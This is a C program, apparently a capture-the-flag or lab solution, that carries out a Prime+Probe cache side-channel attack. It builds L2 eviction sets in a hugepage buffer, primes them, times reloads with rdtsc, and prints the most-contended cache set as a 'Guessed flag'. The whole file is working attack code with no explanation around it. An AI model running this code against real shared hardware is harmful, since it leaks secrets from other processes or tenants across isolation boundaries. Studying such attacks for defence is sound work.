#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

#define NUM_L2_CACHE_SETS 1024
#define WAYS 16
#define REPEATS 3000

static inline uint64_t rdtsc() {
    unsigned int lo, hi;
    asm volatile ("mfence\nlfence\nrdtsc" : "=a"(lo), "=d"(hi));
    return ((uint64_t)hi << 32) | lo;
}

char* get_buffer() {
    size_t size = 2 * 1024 * 1024;

    char *buf = mmap(NULL, size, PROT_READ | PROT_WRITE,
                     MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB | MAP_POPULATE,
                     -1, 0);

    if (buf == (void*)-1) {
        perror("mmap buffer");
        exit(1);
    }

    buf[0] = 1;
    return buf;
}

void get_eviction_set(char *buf, char *eviction_set[WAYS], int set) {

    for (int i = 0; i < WAYS; i++) {
        eviction_set[i] = buf + set*64 + i*65536;
    }
}

int main() {

    char *buf = get_buffer();

    char *eviction_sets[NUM_L2_CACHE_SETS][WAYS];

    for (int i = 0; i < NUM_L2_CACHE_SETS; i++)
        get_eviction_set(buf, eviction_sets[i], i);

    printf("Attacker ready. Prime+Probe starting...\n");

    volatile char tmp;

    while (1) {

        uint64_t scores[NUM_L2_CACHE_SETS] = {0};

        for (int r = 0; r < REPEATS; r++) {

            /* PRIME */
            for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
                for (int w = 0; w < WAYS; w++)
                    tmp = *eviction_sets[set][w];
            }

            asm volatile("mfence; lfence");

            usleep(50);

            /* PROBE */
            for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {

                for (int w = 0; w < WAYS; w++) {

                    uint64_t start = rdtsc();
                    tmp = *eviction_sets[set][w];
                    uint64_t end = rdtsc();

                    scores[set] += (end - start);
                }
            }
        }

        int best = -1;
        uint64_t max = 0;

        for (int i = 0; i < NUM_L2_CACHE_SETS; i++) {

            uint64_t avg = scores[i] / REPEATS;

            if (avg > max) {
                max = avg;
                best = i;
            }
        }

        printf("Guessed flag: %d (lat=%lu)\n", best, max);
        fflush(stdout);

        usleep(300000);
    }
}